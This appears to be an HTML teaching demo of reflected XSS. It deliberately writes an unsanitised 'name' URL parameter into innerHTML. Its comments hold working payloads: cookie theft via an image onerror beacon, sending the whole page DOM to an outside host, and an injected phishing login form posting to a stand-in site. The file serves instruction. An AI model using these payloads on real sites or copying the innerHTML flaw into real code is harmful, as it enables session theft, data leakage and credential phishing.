<!--?name=<img%20src%3D"does-not-exist"%20onerror%3D"var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%60127.0.0.1%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D%60%3B%20document.querySelector(%27body%27).appendChild(img)%3B">-->
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>XSS Example</title>
  </head>
  <body>
    <h1>XSS Attack</h1>
    <div>
      <span id="username"></span>
    </div>

    <!--set cookie-->
    <script>
      function setCookies(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60);

        const expire = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expire;

        console.log(name + "=" + value + ", expires=	" + expire);
      }

      setCookies("examplecookie", "Hello, I am a cookie", 5);
    </script>

    <!--vulnerable code-->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");
      //  sanitizedName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;"); use textContent()
      console.log(name, params, window.location.search);
      document.getElementById("username").innerHTML = name;
    </script>

    <!--utility function-->
    <script>
      function createPost(title, description) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/post", true);
        console.log(document.cookie);
        xhr.withCredentials = true;
        xhr.setRequestHeader(
          "Content-type",
          "application/x-www-form-urlencoded"
        );
        xhr.send(`txtName= ${title}&mtxMessage=${description}`);
      }
    </script>
  </body>
</html>

<!--**** KEY STROKE ****-->
<!-- example2.html?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement(\'img\'); img.src = `127.0.0.1/cookie?data=${document.cookie}`; document.querySelector(\'body\').appendChild(img);\"> -->

<!--Critical info (suppose all your bank document is loaded on page, it will send a entire DOM to hackers website)-->
<!--<img src="empty.gif" onerror="var myCookie = document.cookie; new Image().src=`https://falepage.php?output=${document.body.innerHTML}`" />-->

<!--Phising attack-->
<!--example2.html?name=<h3>Login form</h3>
<form action="http://example.com/fakepage.php">
  <input type="text" name="username" placeholder="Enter your username" />
  <input type="password" name="password" placeholder="Enter your password" />
  <button type="submit">Submit</button>
</form>-->
